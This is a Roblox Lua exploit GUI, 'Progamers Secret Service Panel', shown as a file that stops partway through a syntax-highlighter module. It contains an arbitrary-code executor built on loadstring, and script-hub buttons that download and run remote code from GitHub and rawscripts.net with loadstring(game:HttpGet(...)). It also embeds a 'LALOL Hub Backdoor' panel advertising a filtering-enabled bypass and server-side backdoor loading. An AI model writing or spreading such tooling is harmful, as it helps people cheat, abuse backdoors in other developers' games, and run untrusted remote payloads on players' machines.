-- Gui to Lua
-- Version: 3.2

-- Instances:

local plr = game.Players.LocalPlayer
local name = plr.Name
local userid = plr.UserId






local SecretServicePanel = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local tabhold = Instance.new("Frame")
local exebutton = Instance.new("TextButton")
local homebut = Instance.new("TextButton")
local executor = Instance.new("Frame")
local codeBox = Instance.new("TextBox")
local execute = Instance.new("TextButton")
local clear = Instance.new("TextButton")

local scriptbutton = Instance.new("TextButton")
local home = Instance.new("Frame")
local wel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local TextLabel_6 = Instance.new("TextLabel")
local scripthub = Instance.new("Frame")
local TextLabel_7 = Instance.new("TextLabel")
local dex = Instance.new("TextButton")
local Iy = Instance.new("TextButton")
local psmeg = Instance.new("TextButton")
local remabuse = Instance.new("TextButton")
local TextLabel_8 = Instance.new("TextLabel")

--Properties:

SecretServicePanel.Name = "SecretServicePanel"
SecretServicePanel.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
SecretServicePanel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

main.Name = "main"
main.Parent = SecretServicePanel
main.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
main.BorderColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.299843013, 0, 0.148648649, 0)
main.Size = UDim2.new(0, 509, 0, 311)

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 509, 0, 28)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Progamers Secret Service Panel V1"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14.000

tabhold.Name = "tabhold"
tabhold.Parent = main
tabhold.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
tabhold.BorderColor3 = Color3.fromRGB(0, 0, 0)
tabhold.BorderSizePixel = 0
tabhold.Size = UDim2.new(0, 128, 0, 311)

exebutton.Name = "exebutton"
exebutton.Parent = tabhold
exebutton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
exebutton.BorderColor3 = Color3.fromRGB(0, 0, 0)
exebutton.BorderSizePixel = 0
exebutton.Position = UDim2.new(0, 0, 0.305466235, 0)
exebutton.Size = UDim2.new(0, 128, 0, 50)
exebutton.Font = Enum.Font.SourceSans
exebutton.Text = "Executor"
exebutton.TextColor3 = Color3.fromRGB(255, 255, 255)
exebutton.TextScaled = true
exebutton.TextSize = 14.000
exebutton.TextWrapped = true
exebutton.MouseButton1Down:Connect(function()
	executor.Visible = true
	scripthub.Visible = false
	home.Visible = false
end)

homebut.Name = "homebut"
homebut.Parent = tabhold
homebut.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
homebut.BorderColor3 = Color3.fromRGB(0, 0, 0)
homebut.BorderSizePixel = 0
homebut.Position = UDim2.new(0, 0, 0.106109321, 0)
homebut.Size = UDim2.new(0, 128, 0, 50)
homebut.Font = Enum.Font.SourceSans
homebut.Text = "Home"
homebut.TextColor3 = Color3.fromRGB(255, 255, 255)
homebut.TextScaled = true
homebut.TextSize = 14.000
homebut.TextWrapped = true
homebut.MouseButton1Down:Connect(function()
	home.Visible = true	
	executor.Visible = false
	scripthub.Visible = false
end)

executor.Name = "executor"
executor.Parent = main
executor.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
executor.BorderColor3 = Color3.fromRGB(0, 0, 0)
executor.BorderSizePixel = 0
executor.Position = UDim2.new(0.251473486, 0, 0.0900321528, 0)
executor.Size = UDim2.new(0, 381, 0, 283)
executor.Visible = false

codeBox.Name = "codeBox"
codeBox.Parent = executor
codeBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
codeBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
codeBox.BorderSizePixel = 0
codeBox.Position = UDim2.new(0.0262467191, 0, 0.0212014131, 0)
codeBox.Size = UDim2.new(0, 211, 0, 236)
codeBox.Font = Enum.Font.SourceSans
codeBox.PlaceholderColor3 = Color3.fromRGB(18, 18, 18)
codeBox.PlaceholderText = "print(\"Progamer_On_Top_Lmao\")"
codeBox.Text = ""
codeBox.TextColor3 = Color3.fromRGB(0, 0, 0)
codeBox.TextSize = 14.000
codeBox.TextXAlignment = Enum.TextXAlignment.Left
codeBox.TextYAlignment = Enum.TextYAlignment.Top

local function executeCode()
	local code = codeBox.Text
	if #code == 0 then
		print("No code entered to execute.")
		return
	end

	-- Use pcall to safely execute the code and catch any errors
	local success, result = pcall(function()
		-- loadstring converts a string into a function.
		-- It's important to note that loadstring is disabled by default in
		-- Roblox Studio's command bar and in published games for security reasons.
		-- However, it IS enabled in LocalScripts running on the client.
		local func = loadstring(code)
		if func then
			-- Set up an environment for the executed code.
			-- This allows the code to access global variables like 'game', 'script', 'Players', etc.
			-- You can customize this environment further if needed.
			local env = getfenv(0) -- Get the current global environment
			setfenv(func, env)
			return func() -- Execute the loaded function
		else
			error("Failed to load string as a function. Check for syntax errors.")
		end
	end)

	if success then
		print("Code executed successfully. Result:", result)
	else
		warn("Error executing code:", result)
	end
end

execute.Name = "execute"
execute.Parent = executor
execute.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
execute.BorderSizePixel = 0
execute.Position = UDim2.new(0.619422555, 0, 0.0194630437, 0)
execute.Size = UDim2.new(0, 128, 0, 50)
execute.Font = Enum.Font.SourceSans
execute.Text = "Execute"
execute.TextColor3 = Color3.fromRGB(255, 255, 255)
execute.TextScaled = true
execute.TextSize = 14.000
execute.TextWrapped = true
execute.MouseButton1Down:Connect(function()
	executeCode()
end)

clear.Name = "clear"
clear.Parent = executor
clear.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
clear.BorderSizePixel = 0
clear.Position = UDim2.new(0.619422555, 0, 0.238544315, 0)
clear.Size = UDim2.new(0, 128, 0, 50)
clear.Font = Enum.Font.SourceSans
clear.Text = "Clear"
clear.TextColor3 = Color3.fromRGB(255, 255, 255)
clear.TextScaled = true
clear.TextSize = 14.000
clear.TextWrapped = true
clear.MouseButton1Down:Connect(function()
	codeBox.Text = ""
end)



scriptbutton.Name = "scriptbutton"
scriptbutton.Parent = executor
scriptbutton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
scriptbutton.BorderColor3 = Color3.fromRGB(0, 0, 0)
scriptbutton.BorderSizePixel = 0
scriptbutton.Position = UDim2.new(0.619422555, 0, 0.655505478, 0)
scriptbutton.Size = UDim2.new(0, 128, 0, 50)
scriptbutton.Font = Enum.Font.SourceSans
scriptbutton.Text = "Script hub"
scriptbutton.TextColor3 = Color3.fromRGB(255, 255, 255)
scriptbutton.TextScaled = true
scriptbutton.TextSize = 14.000
scriptbutton.TextWrapped = true
scriptbutton.MouseButton1Down:Connect(function()
	scripthub.Visible = not scripthub.Visible
end)

home.Name = "home"
home.Parent = main
home.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
home.BorderColor3 = Color3.fromRGB(0, 0, 0)
home.BorderSizePixel = 0
home.Position = UDim2.new(0.251473486, 0, 0.0900321528, 0)
home.Size = UDim2.new(0, 381, 0, 283)

wel.Name = "wel"
wel.Parent = home
wel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
wel.BackgroundTransparency = 1.000
wel.BorderColor3 = Color3.fromRGB(0, 0, 0)
wel.BorderSizePixel = 0
wel.Position = UDim2.new(0.0262467191, 0, 0.0176678449, 0)
wel.Size = UDim2.new(0, 200, 0, 50)
wel.Font = Enum.Font.SourceSans
wel.Text = "Welcome "..name
wel.TextColor3 = Color3.fromRGB(255, 255, 255)
wel.TextSize = 14.000
wel.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_2.Parent = home
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0262467191, 0, 0.102473497, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Current Version:1.0"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 14.000
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_3.Parent = home
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.0262467191, 0, 0.194346294, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Credits:Progamer"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 14.000
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_4.Parent = home
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0.475065619, 0, 0.0176678449, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "Whitelisted = true"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 14.000
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_5.Parent = home
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(0.475065619, 0, 0.148409888, 0)
TextLabel_5.Size = UDim2.new(0, 200, 0, 50)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "workspace.fe.Enabled = true"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextSize = 14.000
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_6.Parent = home
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(0.0262467191, 0, 0.325088352, 0)
TextLabel_6.Size = UDim2.new(0, 200, 0, 50)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "Changelog: Version 1.0 Made"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextSize = 14.000
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left

scripthub.Name = "scripthub"
scripthub.Parent = SecretServicePanel
scripthub.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
scripthub.BorderColor3 = Color3.fromRGB(0, 0, 0)
scripthub.BorderSizePixel = 0
scripthub.Position = UDim2.new(0.732431471, 0, 0.148648649, 0)
scripthub.Size = UDim2.new(0, 312, 0, 269)
scripthub.Visible = false

TextLabel_7.Parent = scripthub
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.BorderSizePixel = 0
TextLabel_7.Size = UDim2.new(0, 312, 0, 28)
TextLabel_7.Font = Enum.Font.SourceSans
TextLabel_7.Text = "Progamers Script Hub"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextSize = 14.000

dex.Name = "dex"
dex.Parent = scripthub
dex.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
dex.BorderColor3 = Color3.fromRGB(0, 0, 0)
dex.BorderSizePixel = 0
dex.Position = UDim2.new(0.0352564119, 0, 0.152490899, 0)
dex.Size = UDim2.new(0, 290, 0, 39)
dex.Font = Enum.Font.SourceSans
dex.Text = "Dex:Progamer Edition"
dex.TextColor3 = Color3.fromRGB(255, 255, 255)
dex.TextScaled = true
dex.TextSize = 14.000
dex.TextWrapped = true
dex.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/progamerdoesscripts/robloxscripts/refs/heads/main/dexedit"))()
end)

Iy.Name = "Iy"
Iy.Parent = scripthub
Iy.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Iy.BorderColor3 = Color3.fromRGB(0, 0, 0)
Iy.BorderSizePixel = 0
Iy.Position = UDim2.new(0.0352564119, 0, 0.326887399, 0)
Iy.Size = UDim2.new(0, 290, 0, 36)
Iy.Font = Enum.Font.SourceSans
Iy.Text = "Infinite Yield"
Iy.TextColor3 = Color3.fromRGB(255, 255, 255)
Iy.TextScaled = true
Iy.TextSize = 14.000
Iy.TextWrapped = true
Iy.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-31802"))()
end)

psmeg.Name = "psmeg"
psmeg.Parent = scripthub
psmeg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
psmeg.BorderColor3 = Color3.fromRGB(0, 0, 0)
psmeg.BorderSizePixel = 0
psmeg.Position = UDim2.new(0.0352564119, 0, 0.493849069, 0)
psmeg.Size = UDim2.new(0, 290, 0, 41)
psmeg.Font = Enum.Font.SourceSans
psmeg.Text = "Project Smegma(scanner)"
psmeg.TextColor3 = Color3.fromRGB(255, 255, 255)
psmeg.TextScaled = true
psmeg.TextSize = 14.000
psmeg.TextWrapped = true
psmeg.MouseButton1Down:Connect(function()
	-- Gui to Lua
	-- Version: 3.2

	-- Instances:





















































	function CP()
	--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
]=]

		-- Instances: 33 | Scripts: 3 | Modules: 3
		local G2L = {};

		-- StarterGui.LALOL Hub Backdoor
		G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
		G2L["1"]["Name"] = [[LALOL Hub Backdoor]];
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
		G2L["1"]["ResetOnSpawn"] = false;

		-- StarterGui.LALOL Hub Backdoor.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2"]["Size"] = UDim2.new(0, 482, 0, 276);
		G2L["2"]["Position"] = UDim2.new(0.27320125699043274, 0, 0.3018597960472107, 0);

		-- StarterGui.LALOL Hub Backdoor.Frame.UIStroke
		G2L["3"] = Instance.new("UIStroke", G2L["2"]);
		G2L["3"]["Color"] = Color3.fromRGB(255, 255, 255);

		-- StarterGui.LALOL Hub Backdoor.Frame.UIStroke.UIGradient
		G2L["4"] = Instance.new("UIGradient", G2L["3"]);
		G2L["4"]["Rotation"] = 50;
		G2L["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))};

		-- StarterGui.LALOL Hub Backdoor.Frame.UICorner
		G2L["5"] = Instance.new("UICorner", G2L["2"]);


		-- StarterGui.LALOL Hub Backdoor.Frame.Executor
		G2L["6"] = Instance.new("Folder", G2L["2"]);
		G2L["6"]["Name"] = [[Executor]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute
		G2L["7"] = Instance.new("Frame", G2L["6"]);
		G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7"]["BackgroundTransparency"] = 1;
		G2L["7"]["Size"] = UDim2.new(0, 290, 0, 28);
		G2L["7"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.8708109259605408, 0);
		G2L["7"]["Name"] = [[Execute]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.Button
		G2L["8"] = Instance.new("TextButton", G2L["7"]);
		G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8"]["TextSize"] = 22;
		G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["8"]["TextColor3"] = Color3.fromRGB(51, 215, 0);
		G2L["8"]["Size"] = UDim2.new(1, 0, 1, 0);
		G2L["8"]["Name"] = [[Button]];
		G2L["8"]["Text"] = [[Execute]];
		G2L["8"]["BackgroundTransparency"] = 1;

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.UICorner
		G2L["9"] = Instance.new("UICorner", G2L["7"]);


		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.UIStroke
		G2L["a"] = Instance.new("UIStroke", G2L["7"]);
		G2L["a"]["Color"] = Color3.fromRGB(51, 215, 0);

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear
		G2L["b"] = Instance.new("Frame", G2L["6"]);
		G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b"]["BackgroundTransparency"] = 1;
		G2L["b"]["Size"] = UDim2.new(0, 162, 0, 28);
		G2L["b"]["Position"] = UDim2.new(0.6400582790374756, 0, 0.8708109855651855, 0);
		G2L["b"]["Name"] = [[Clear]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.Button
		G2L["c"] = Instance.new("TextButton", G2L["b"]);
		G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["c"]["TextSize"] = 22;
		G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["c"]["TextColor3"] = Color3.fromRGB(36, 236, 203);
		G2L["c"]["Size"] = UDim2.new(1, 0, 1, 0);
		G2L["c"]["Name"] = [[Button]];
		G2L["c"]["Text"] = [[Clear]];
		G2L["c"]["BackgroundTransparency"] = 1;

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.UICorner
		G2L["d"] = Instance.new("UICorner", G2L["b"]);


		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.UIStroke
		G2L["e"] = Instance.new("UIStroke", G2L["b"]);
		G2L["e"]["Color"] = Color3.fromRGB(36, 236, 203);

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox
		G2L["f"] = Instance.new("Frame", G2L["6"]);
		G2L["f"]["BackgroundColor3"] = Color3.fromRGB(22, 22, 22);
		G2L["f"]["Size"] = UDim2.new(0, 462, 0, 163);
		G2L["f"]["Position"] = UDim2.new(0.01962907239794731, 0, 0.24310137331485748, 0);
		G2L["f"]["Name"] = [[ExecutorBox]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.UICorner
		G2L["10"] = Instance.new("UICorner", G2L["f"]);


		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox
		G2L["11"] = Instance.new("TextBox", G2L["f"]);
		G2L["11"]["TextSize"] = 14;
		G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
		G2L["11"]["TextWrapped"] = true;
		G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
		G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["11"]["TextColor3"] = Color3.fromRGB(198, 119, 88);
		G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["11"]["MultiLine"] = true;
		G2L["11"]["BackgroundTransparency"] = 1;
		G2L["11"]["PlaceholderText"] = [[require(6666666).load("c00lkidd")]];
		G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
		G2L["11"]["Text"] = [[]];
		G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
		G2L["11"]["ClearTextOnFocus"] = false;

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
		G2L["12"] = Instance.new("LocalScript", G2L["11"]);
		G2L["12"]["Name"] = [[Highlight]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter
		G2L["13"] = Instance.new("ModuleScript", G2L["12"]);
		G2L["13"]["Name"] = [[Highlighter]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer
		G2L["14"] = Instance.new("ModuleScript", G2L["13"]);
		G2L["14"]["Name"] = [[lexer]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer.language
		G2L["15"] = Instance.new("ModuleScript", G2L["14"]);
		G2L["15"]["Name"] = [[language]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Scanner
		G2L["16"] = Instance.new("Frame", G2L["2"]);
		G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["16"]["BackgroundTransparency"] = 1;
		G2L["16"]["Size"] = UDim2.new(0, 370, 0, 107);
		G2L["16"]["Position"] = UDim2.new(0.1166670024394989, 0, 0.30478382110595703, 0);
		G2L["16"]["Visible"] = false;
		G2L["16"]["Name"] = [[Scanner]];

		-- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UIStroke
		G2L["17"] = Instance.new("UIStroke", G2L["16"]);
		G2L["17"]["Color"] = Color3.fromRGB(255, 255, 255);

		-- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UIStroke.UIGradient
		G2L["18"] = Instance.new("UIGradient", G2L["17"]);
		G2L["18"]["Rotation"] = 50;
		G2L["18"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 108)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 231, 171))};

		-- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UICorner
		G2L["19"] = Instance.new("UICorner", G2L["16"]);


		-- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button
		G2L["1a"] = Instance.new("TextButton", G2L["16"]);
		G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1a"]["TextSize"] = 43;
		G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["1a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1a"]["Size"] = UDim2.new(1, 0, 1, 0);
		G2L["1a"]["Name"] = [[Button]];
		G2L["1a"]["Text"] = [[Load TS]];
		G2L["1a"]["BackgroundTransparency"] = 1;

		-- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button.UIGradient
		G2L["1b"] = Instance.new("UIGradient", G2L["1a"]);
		G2L["1b"]["Rotation"] = 50;
		G2L["1b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 108)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 231, 171))};

		-- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button.UIStroke
		G2L["1c"] = Instance.new("UIStroke", G2L["1a"]);
		G2L["1c"]["Color"] = Color3.fromRGB(255, 255, 255);

		-- StarterGui.LALOL Hub Backdoor.Frame.TextLabel
		G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
		G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1d"]["FontFace"] = Font.new([[rbxassetid://12187365977]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["1d"]["TextSize"] = 49;
		G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1d"]["Size"] = UDim2.new(0, 460, 0, 50);
		G2L["1d"]["Text"] = [[Real fe bypass!!!!1 smeg]];
		G2L["1d"]["BackgroundTransparency"] = 1;
		G2L["1d"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.025362318381667137, 0);

		-- StarterGui.LALOL Hub Backdoor.Frame.TextLabel.UIStroke
		G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
		G2L["1e"]["Color"] = Color3.fromRGB(255, 255, 255);

		-- StarterGui.LALOL Hub Backdoor.Frame.TextLabel.UIStroke.UIGradient
		G2L["1f"] = Instance.new("UIGradient", G2L["1e"]);
		G2L["1f"]["Rotation"] = 50;
		G2L["1f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))};

		-- StarterGui.LALOL Hub Backdoor.LocalScript
		G2L["20"] = Instance.new("LocalScript", G2L["1"]);


		-- StarterGui.LALOL Hub Backdoor.Dragify
		G2L["21"] = Instance.new("LocalScript", G2L["1"]);
		G2L["21"]["Name"] = [[Dragify]];

		-- Require G2L wrapper
		local G2L_REQUIRE = require;
		local G2L_MODULES = {};
		local function require(Module:ModuleScript)
			local ModuleState = G2L_MODULES[Module];
			if ModuleState then
				if not ModuleState.Required then
					ModuleState.Required = true;
					ModuleState.Value = ModuleState.Closure();
				end
				return ModuleState.Value;
			end;
			return G2L_REQUIRE(Module);
		end

		G2L_MODULES[G2L["13"]] = {
			Closure = function()
				local script = G2L["13"];
--[[
export type HighlighterColors = { [string]: Color3 }

export type TextObject = TextLabel | TextBox

export type HighlightProps = {
	textObject: TextObject,
	src: string?,
	forceUpdate: boolean?,
	lexer: Lexer?,
	customLang: { [string]: string }?
}

export type Lexer = {
	scan: (src: string) -> () -> (string, string),
	navigator: () -> any,
	finished: boolean?,
}

export type Highlighter = {
	defaultLexer: Lexer,
	setTokenColors: (colors: HighlighterColors?) -> (),
	highlight: (props: HighlightProps) -> (() -> ())?,
	refresh: () -> (),
}

export type ObjectData = {
	Text: string,
	Labels: { TextLabel },
	Lines: { string },
	Lexer: Lexer?,
	CustomLang: { [string]: string }?,
}
--]]

				local function SanitizeRichText(s: string): string
					return string.gsub(
						string.gsub(string.gsub(string.gsub(string.gsub(s, "&", "&amp;"), "<", "&lt;"), ">", "&gt;"), '"', "&quot;"),
						"'",
						"&apos;"
					)
				end

				local function SanitizeTabs(s: string): string
					return string.gsub(s, "\t", "    ")
				end

				local function SanitizeControl(s: string): string
					return string.gsub(s, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
				end

				local TokenColors: HighlighterColors = {
					["background"] = Color3.fromRGB(47, 47, 47),
					["iden"] = Color3.fromRGB(234, 234, 234),
					["keyword"] = Color3.fromRGB(215, 174, 255),
					["builtin"] = Color3.fromRGB(131, 206, 255),
					["string"] = Color3.fromRGB(196, 255, 193),
					["number"] = Color3.fromRGB(255, 125, 125),
					["comment"] = Color3.fromRGB(140, 140, 155),
					["operator"] = Color3.fromRGB(255, 239, 148),
					["custom"] = Color3.fromRGB(119, 122, 255),
				}
				local ColorFormatter: { [Color3]: string } = {}
				local LastData: { [TextObject]: ObjectData } = {}
				local Cleanups: { [TextObject]: () -> () } = {}

				local Highlighter = {
					defaultLexer = require(script.lexer),
				}

				function Highlighter.highlight(props: HighlightProps)
					-- Gather props
					local textObject = props.textObject
					local src = SanitizeTabs(SanitizeControl(props.src or textObject.Text))
					local lexer = props.lexer or Highlighter.defaultLexer
					local customLang = props.customLang
					local forceUpdate = props.forceUpdate

					-- Avoid updating when unnecessary
					local data = LastData[textObject]
					if data == nil then
						data = {
							Text = "",
							Labels = {},
							Lines = {},
							Lexer = lexer,
							CustomLang = customLang,
						}
						LastData[textObject] = data
					elseif forceUpdate ~= true and data.Text == src then
						return
					end

					local lineLabels = data.Labels
					local previousLines = data.Lines

					local lines = string.split(src, "\n")

					data.Lines = lines
					data.Text = src
					data.Lexer = lexer
					data.CustomLang = customLang

					-- Ensure valid object properties
					textObject.RichText = false
					textObject.Text = src
					textObject.TextXAlignment = Enum.TextXAlignment.Left
					textObject.TextYAlignment = Enum.TextYAlignment.Top
					textObject.BackgroundColor3 = TokenColors.background
					textObject.TextColor3 = TokenColors.iden
					textObject.TextTransparency = 0.5

					-- Build the highlight labels
					local lineFolder = textObject:FindFirstChild("SyntaxHighlights")
					if lineFolder == nil then
						local newLineFolder = Instance.new("Folder")
						newLineFolder.Name = "SyntaxHighlights"
						newLineFolder.Parent = textObject

						lineFolder = newLineFolder
					end

					-- Add a cleanup handler for this textObject
					local cleanup = Cleanups[textObject]
					if not cleanup then
						local connections: { RBXScriptConnection } = {}
						local function newCleanup()
							for _, label in ipairs(lineLabels) do
								label:Destroy()
							end
							table.clear(lineLabels)
							lineLabels = nil

							LastData[textObject] = nil
							Cleanups[textObject] = nil

							for _, connection in connections do
								connection:Disconnect()
							end
